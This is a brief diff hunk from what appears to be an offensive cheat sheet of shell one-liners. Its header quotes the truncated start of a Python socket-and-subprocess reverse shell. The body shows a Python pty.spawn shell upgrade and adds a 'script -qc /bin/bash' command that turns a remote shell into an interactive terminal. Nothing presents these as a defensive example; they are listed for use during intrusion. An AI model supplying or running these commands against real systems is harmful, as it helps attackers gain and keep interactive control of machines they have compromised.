@@ -43,6 +43,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```python
   python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+```
 
 
 
